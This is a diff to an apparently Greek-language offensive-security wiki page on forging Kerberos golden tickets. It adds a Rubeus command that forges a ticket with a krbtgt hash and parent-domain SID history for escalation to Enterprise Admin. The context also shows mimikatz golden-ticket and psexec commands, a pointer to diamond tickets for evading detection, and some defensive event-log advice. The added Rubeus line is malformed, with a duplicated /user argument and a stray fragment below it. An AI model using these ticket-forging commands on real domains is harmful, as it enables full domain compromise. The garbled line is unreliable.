@@ -16,6 +16,12 @@ python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
 ```
 
 ```bash:From Windows
+# Rubeus
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+.\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+/rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /ptt
 #mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
 .\Rubeus.exe ptt /ticket:ticket.kirbi
@@ -32,11 +38,11 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
-Χρησιμοποιήστε τις παραμέτρους `/startoffset`, `/endin` και `/renewmax` για να ελέγξετε την αρχική απόκλιση, τη διάρκεια και τις μέγιστες ανανεώσεις (όλα σε λεπτά).
+Χρησιμοποιήστε τις παραμέτρους `/startoffset`, `/endin` και `/renewmax` για να ελέγξετε την αρχική απόκλιση, τη διάρκεια και τις μέγιστες ανανεώσεις (όλες σε λεπτά).
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
-Δυστυχώς, η διάρκεια ζωής του TGT δεν καταγράφεται στα 4769, οπότε δεν θα βρείτε αυτές τις πληροφορίες στα Windows event logs. Ωστόσο, αυτό που μπορείτε να συσχετίσετε είναι **η εμφάνιση 4769 χωρίς προηγούμενο 4768**. Είναι **αδύνατο να ζητήσετε ένα TGS χωρίς ένα TGT**, και αν δεν υπάρχει καταγραφή ενός TGT που να έχει εκδοθεί, μπορούμε να συμπεράνουμε ότι έχει κατασκευαστεί offline.
+Δυστυχώς, η διάρκεια ζωής του TGT δεν καταγράφεται στα 4769, οπότε δεν θα βρείτε αυτές τις πληροφορίες στα Windows event logs. Ωστόσο, αυτό που μπορείτε να συσχετίσετε είναι **η εμφάνιση 4769 χωρίς προηγούμενο 4768**. Είναι **αδύνατο να ζητήσετε ένα TGS χωρίς ένα TGT**, και αν δεν υπάρχει καταγραφή ότι εκδόθηκε ένα TGT, μπορούμε να συμπεράνουμε ότι κατασκευάστηκε offline.
 
 Για να **παρακάμψετε αυτή την ανίχνευση**, ελέγξτε τα diamond tickets:
 
@@ -50,7 +56,7 @@ diamond-ticket.md
 - 4672: Admin Logon
 - `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`
 
-Άλλες μικρές τεχνικές που μπορούν να χρησιμοποιήσουν οι αμυντικοί είναι **να ειδοποιούν για 4769 για ευαίσθητους χρήστες** όπως ο προεπιλεγμένος λογαριασμός διαχειριστή τομέα.
+Άλλες μικρές τεχνικές που μπορούν να κάνουν οι αμυντικοί είναι **να ειδοποιούν για 4769's για ευαίσθητους χρήστες** όπως ο προεπιλεγμένος λογαριασμός διαχειριστή τομέα.
 
 ## References
 
